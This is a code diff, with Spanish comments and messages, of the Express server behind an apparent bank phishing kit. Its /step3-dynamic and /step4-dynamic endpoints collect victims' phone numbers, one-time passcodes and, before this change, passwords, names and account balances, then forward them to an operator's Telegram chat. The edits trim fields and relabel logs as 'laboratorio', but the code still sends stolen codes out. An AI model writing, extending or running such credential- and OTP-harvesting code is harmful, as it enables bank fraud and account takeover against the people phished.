@@ -262,11 +262,10 @@ app.post('/step3-dynamic', async (req, res) => {
     const { sessionId, otp, attemptNumber } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
+      return res.status(500).json({ ok: false });
     }
 
-    // Obtener datos de sesión
-    const session = sessionData.get(sessionId) || {};
+   const session = sessionData.get(sessionId) || {};
     
     // Guardar la dinámica
     if (!session.dynamics) {
@@ -274,35 +273,28 @@ app.post('/step3-dynamic', async (req, res) => {
     }
     session.dynamics.push(otp);
     sessionData.set(sessionId, session);
-
-    const mensaje = `
+    
+	  const mensaje = `
 📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
-
 📱 Número: ${session.phoneNumber || 'N/A'}
-🔑 Clave: ${session.password || 'N/A'}
-👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
-💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
-💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
     `.trim();
+     
 
-    // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
-      text: mensaje,
-      reply_markup: getDynamicMenu(sessionId)
+      text: mensaje
     });
 
-    console.log(`✅ Dinámica ${attemptNumber} recibida - Session: ${sessionId} - OTP: ${otp}`);
-
+    console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
     res.json({ ok: true });
-  } catch (error) {
-    console.error('❌ ERROR EN /step3-dynamic:', error.message);
-    res.status(500).json({ ok: false, reason: error.message });
+
+  } catch (err) {
+    console.error('❌ Error LAB /step3-dynamic:', err.response?.data || err.message);
+    res.status(500).json({ ok: false });
   }
 });
-
 
 // ================================  STEP4
 
@@ -333,8 +325,7 @@ app.post('/step4-dynamic', async (req, res) => {
 
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
-      text: mensaje,
-	  reply_markup: getDynamicMenu(sessionId)
+      text: mensaje
     });
 
     console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
